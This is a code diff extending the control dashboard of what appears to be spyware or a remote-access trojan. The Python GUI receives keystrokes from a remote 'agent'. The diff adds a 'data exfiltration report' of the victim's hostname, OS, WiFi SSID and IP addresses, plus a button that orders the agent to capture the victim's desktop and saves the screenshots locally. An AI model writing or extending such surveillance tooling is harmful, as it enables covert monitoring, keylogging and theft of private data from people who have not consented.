@@ -17,11 +17,14 @@
 """
 
 import socket
+import io
+import base64
+from PIL import Image
 import json
 import threading
 import time
 import tkinter as tk
-from tkinter import ttk, scrolledtext
+from tkinter import ttk, scrolledtext,messagebox
 from collections import defaultdict
 
 
@@ -76,6 +79,7 @@ class Dashboard(tk.Tk):
         self._current_ctx   = "App"
         self._prev_sent = 0
         self._prev_recv = 0
+        self._target_sys_info = None
 
         self._build_ui()
         self._start_server()
@@ -106,6 +110,12 @@ class Dashboard(tk.Tk):
         self.lbl_agent_ip = tk.Label(inner_top, text="",
                                      font=FONT_UI, fg=DIM, bg="#090b14")
         self.lbl_agent_ip.pack(side="right", padx=10)
+
+        # --- TARGET PROFILE BUTTON ---
+        tk.Button(inner_top, text="⬡ TARGET PROFILE", font=("Segoe UI", 9, "bold"),
+                  bg="#a29bfe", fg="#090b14", relief="flat", padx=10, pady=2, cursor="hand2",
+                  command=self._show_target_profile).pack(side="right", padx=10)
+        # ----------------------------------
 
         # Thin accent line
         tk.Frame(self, bg=GREEN, height=2).pack(fill="x")
@@ -380,7 +390,32 @@ class Dashboard(tk.Tk):
             self._update_stats(pkt["data"])
         elif t == "keystroke":
             self._handle_keystroke(pkt["data"])
+        elif t == "sys_info":                   
+            self._target_sys_info = pkt["data"] 
+        elif t == "screenshot_resp":                  
+            self._save_screenshot(pkt["data"])
 
+    def _save_screenshot(self, b64_data):
+        """Decodes the incoming screenshot and saves it to disk"""
+        try:
+            # 1. Decode the base64 text back into raw bytes
+            img_data = base64.b64decode(b64_data)
+            
+            # 2. Open it as an Image
+            img = Image.open(io.BytesIO(img_data))
+            
+            # 3. Create a unique filename using the current time
+            timestamp = time.strftime("%Y%m%d_%H%M%S")
+            filename = f"target_desktop_{timestamp}.png"
+            
+            # 4. Save it to the same folder where your dashboard script is
+            img.save(filename)
+            
+            self._log_timeline(f"[{time.strftime('%H:%M:%S')}] 📷 Screenshot saved as {filename}", "special")
+            messagebox.showinfo("Screenshot Captured", f"Successfully captured and saved as:\n{filename}")
+            
+        except Exception as e:
+            messagebox.showerror("Screenshot Error", f"Failed to process screenshot:\n{e}")
     # ════════════════════════════════════════════════════════
     #  UI UPDATERS
     # ════════════════════════════════════════════════════════
@@ -506,6 +541,71 @@ class Dashboard(tk.Tk):
         if b < 1024:      return f"{b} B"
         if b < 1024**2:   return f"{b/1024:.1f} KB"
         return f"{b/1024**2:.2f} MB"
+    
+    def _show_target_profile(self):
+        """Creates the Data Exfiltration / Target Profile popup window"""
+        if not self._target_sys_info:
+            messagebox.showinfo("No Data", "Target profile has not been exfiltrated yet. Ensure agent is connected.")
+            return
+
+        # Create Popup Window
+        win = tk.Toplevel(self)
+        win.title("Target System Profile")
+        win.geometry("450x550")
+        win.configure(bg=BG)
+        win.transient(self) # Keep on top of main window
+        
+        tk.Label(win, text="⬢ DATA EXFILTRATION REPORT", font=("Courier New", 14, "bold"), 
+                 fg=RED, bg=BG).pack(pady=(20, 10))
+                 
+        # Content Frame
+        f = tk.Frame(win, bg=PANEL, bd=1, highlightbackground=BORDER, highlightthickness=1)
+        f.pack(fill="both", expand=True, padx=20, pady=10)
+        
+        # Helper to draw rows
+        def add_row(parent, label, value, color=WHITE):
+            row = tk.Frame(parent, bg=PANEL)
+            row.pack(fill="x", padx=15, pady=8)
+            tk.Label(row, text=label, font=("Segoe UI", 10, "bold"), fg=DIM, bg=PANEL).pack(side="left")
+            tk.Label(row, text=value, font=("Courier New", 10), fg=color, bg=PANEL).pack(side="right")
+            tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=10)
+
+        data = self._target_sys_info
+        
+        # System Info
+        tk.Label(f, text="--- SYSTEM ---", font=("Courier New", 10, "bold"), fg=PURPLE, bg=PANEL).pack(anchor="w", padx=15, pady=(15, 5))
+        add_row(f, "Hostname:", data.get("hostname", "Unknown"), BLUE)
+        add_row(f, "Operating System:", data.get("os", "Unknown"))
+        add_row(f, "Processor:", data.get("processor", "Unknown")[:30] + "...")
+        add_row(f, "System Boot Time:", data.get("boot_time", "Unknown"), YELLOW)
+        
+        # Network Info
+        tk.Label(f, text="--- NETWORK ---", font=("Courier New", 10, "bold"), fg=PURPLE, bg=PANEL).pack(anchor="w", padx=15, pady=(15, 5))
+        add_row(f, "Active WiFi SSID:", data.get("wifi_ssid", "Unknown"), GREEN)
+        
+        # List all Network Interfaces
+        if "interfaces" in data:
+            for iface, ip in data["interfaces"].items():
+                iface_short = (iface[:15] + "..") if len(iface) > 15 else iface
+                add_row(f, f"IP ({iface_short}):", ip, WHITE)
+        # --- NEW: SCREENSHOT BUTTON ---
+        def request_screenshot():
+            if self._conn:
+                try:
+                    self._conn.sendall(b"CMD:SCREENSHOT")
+                    messagebox.showinfo("Command Sent", "Screenshot command sent to agent. Please wait a moment...", parent=win)
+                except Exception as e:
+                    messagebox.showerror("Error", "Lost connection to agent.", parent=win)
+            else:
+                messagebox.showerror("Error", "Agent is not connected.", parent=win)
+
+        tk.Button(f, text="📷 CAPTURE TARGET DESKTOP", font=("Segoe UI", 9, "bold"), 
+                  bg=RED, fg=BG, relief="flat", pady=5, cursor="hand2", 
+                  command=request_screenshot).pack(fill="x", padx=15, pady=10)
+        # ------------------------------
+        # Close Button
+        tk.Button(win, text="CLOSE REPORT", font=("Segoe UI", 10, "bold"), bg=BORDER, fg=WHITE, 
+                  relief="flat", command=win.destroy).pack(pady=15)
 
     def _on_close(self):
         self._running = False
